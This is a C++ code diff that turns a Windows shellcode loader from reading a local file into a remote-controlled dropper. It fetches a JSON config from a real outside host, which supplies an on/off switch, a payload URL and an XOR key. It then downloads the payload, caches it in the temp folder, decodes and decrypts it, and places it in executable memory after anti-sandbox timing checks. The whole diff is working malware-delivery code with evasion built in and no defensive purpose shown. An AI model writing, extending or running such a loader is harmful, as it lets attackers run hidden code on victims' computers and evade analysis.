@@ -2,6 +2,9 @@
 #include <chrono>
 #include <thread>
 #include <vector>
+#include <wininet.h>
+
+#pragma comment(lib, "wininet.lib")
 
 using namespace std;
 using namespace std::chrono;
@@ -110,36 +113,94 @@ void apply_xor(vector<unsigned char>& data, const char* ps, int ps_len) {
     }
 }
 
-int main(int argc, char* argv[]) {
-    if (argc < 3 || lstrcmpA(argv[1], "-file") != 0) return -1;
+vector<unsigned char> download_to_memory(const char* url) {
+    vector<unsigned char> data;
+    HINTERNET hInternet = InternetOpenA("Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return data;
     
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (hUrl) {
+        unsigned char buffer[4096];
+        DWORD bytesRead;
+        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+            data.insert(data.end(), buffer, buffer + bytesRead);
+        }
+        InternetCloseHandle(hUrl);
+    }
+    InternetCloseHandle(hInternet);
+    return data;
+}
+
+const char* find_value(const char* json, const char* key) {
+    static char buffer[512];
+    const char* pos = strstr(json, key);
+    if (!pos) return nullptr;
+    pos = strchr(pos, ':');
+    if (!pos) return nullptr;
+    while (*pos && (*pos == ':' || *pos == ' ' || *pos == '"')) pos++;
+    int i = 0;
+    while (*pos && *pos != '"' && *pos != ',' && *pos != '}' && i < 511) {
+        buffer[i++] = *pos++;
+    }
+    buffer[i] = 0;
+    return buffer;
+}
+
+vector<unsigned char> load_from_cache(const char* version) {
+    vector<unsigned char> data;
+    char path[MAX_PATH];
+    GetTempPathA(MAX_PATH, path);
+    lstrcatA(path, version);
+    
+    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return data;
+    
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    data.resize(fileSize);
+    DWORD bytesRead;
+    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
+    CloseHandle(hFile);
+    return data;
+}
+
+void save_to_cache(const char* version, const vector<unsigned char>& data) {
+    char path[MAX_PATH];
+    GetTempPathA(MAX_PATH, path);
+    lstrcatA(path, version);
+    
+    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD bytesWritten;
+        WriteFile(hFile, data.data(), data.size(), &bytesWritten, NULL);
+        CloseHandle(hFile);
+    }
+}
+
+int main() {
     isTimeAccelerated();
     ddt();
     
-    HANDLE hFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return -1;
+    vector<unsigned char> configData = download_to_memory("https://textdb.online/asapaka");
+    if (configData.empty()) return -1;
     
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    vector<unsigned char> fileData(fileSize);
+    const char* json = (const char*)configData.data();
+    const char* enable = find_value(json, "enable");
+    if (!enable || lstrcmpA(enable, "true") != 0) return 0;
     
-    DWORD bytesRead;
-    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
-    CloseHandle(hFile);
+    const char* version = find_value(json, "version");
+    const char* file_url = find_value(json, "file_url");
+    const char* ps = find_value(json, "ps");
+    if (!version || !file_url || !ps) return -1;
     
-    const char* ps = nullptr;
-    int ps_len = 0;
-    for (int i = 3; i < argc; ++i) {
-        if (lstrcmpA(argv[i], "-ps") == 0 && i + 1 < argc) {
-            ps = argv[i + 1];
-            ps_len = lstrlenA(ps);
-            break;
-        }
+    vector<unsigned char> fileData = load_from_cache(version);
+    if (fileData.empty()) {
+        fileData = download_to_memory(file_url);
+        if (fileData.empty()) return -1;
+        save_to_cache(version, fileData);
     }
     
-    if (ps) {
-        fileData = base64_decode((const char*)fileData.data(), fileData.size());
-        apply_xor(fileData, ps, ps_len);
-    }
+    fileData = base64_decode((const char*)fileData.data(), fileData.size());
+    apply_xor(fileData, ps, lstrlenA(ps));
     
     LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!execMemory) return -1;
